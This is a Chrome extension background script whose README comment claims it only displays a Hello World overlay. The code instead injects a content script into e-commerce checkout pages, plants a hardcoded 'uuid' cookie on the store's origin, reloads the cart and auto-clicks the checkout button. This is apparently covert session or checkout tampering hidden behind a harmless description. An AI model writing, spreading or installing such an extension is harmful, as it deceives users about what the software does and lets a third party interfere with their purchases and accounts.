/**
 * README
 * Load unpacked extension: open chrome://extensions, enable Developer mode,
 * click "Load unpacked" and select this folder.
 * The extension will display a Hello World overlay on every page you visit.
 */

const injectedTabs = new Set();

function handleNavigation(details) {
  // Ignore subframe navigations to ensure we inject only on the main page
  if (details.frameId !== 0) return;
  if (!details.url || !details.url.includes('/checkouts/')) {
    injectedTabs.delete(details.tabId);
    return;
  }

  if (details.transitionType === 'reload' || details.transitionType === 'auto_reload') {
    injectedTabs.delete(details.tabId);
  }

  if (injectedTabs.has(details.tabId)) return;

  injectedTabs.add(details.tabId);
  chrome.scripting.executeScript({
    target: { tabId: details.tabId },
    files: ['content.js'],
  });
}

const filter = { url: [{ urlContains: '/checkouts/' }] };
chrome.webNavigation.onCommitted.addListener(handleNavigation, filter);
chrome.webNavigation.onHistoryStateUpdated.addListener(handleNavigation, filter);
chrome.tabs.onRemoved.addListener(tabId => injectedTabs.delete(tabId));

const waitForTab = (tabId) =>
  new Promise((resolve) => {
    const listener = (updatedTabId, info) => {
      if (updatedTabId === tabId && info.status === 'complete') {
        chrome.tabs.onUpdated.removeListener(listener);
        resolve();
      }
    };
    chrome.tabs.onUpdated.addListener(listener);
  });

const setCookie = (details) =>
  new Promise((resolve) => {
    chrome.cookies.set(details, resolve);
  });

async function addCookieAndCheckout() {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  const tab = tabs[0];
  if (!tab || !tab.id || !tab.url) return;

  try {
    let urlObj;
    try {
      urlObj = new URL(tab.url);
    } catch (e) {
      return;
    }

    const targetUrl = `${urlObj.origin}/cart`;

    await chrome.tabs.update(tab.id, { url: targetUrl });
    await waitForTab(tab.id);

    await setCookie({
      url: `${urlObj.origin}/`,
      name: 'uuid',
      value: 'b88a40af-0e8b-42d3-bda7-fd6bdb0427a3',
      path: '/',
    });

    await chrome.tabs.reload(tab.id);
    await waitForTab(tab.id);

    await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => {
        const selectors = [
          'button[name="checkout"]',
          '#checkout',
          'button.checkout',
          'a.checkout',
        ];
        for (const sel of selectors) {
          const el = document.querySelector(sel);
          if (el) {
            setTimeout(() => {
              el.click();
            }, 2000);
            break;
          }
        }
      },
    });

    await waitForTab(tab.id);
    chrome.tabs.sendMessage(tab.id, { type: 'RESULT', status: 'success' });
  } catch (e) {
    if (tab.id) {
      chrome.tabs.sendMessage(tab.id, { type: 'RESULT', status: 'error' });
    }
  }
}

chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg?.type === 'ADD_COOKIE') {
    addCookieAndCheckout();
  } else if (msg?.action === 'openPopup') {
    chrome.action.openPopup();
  }
});
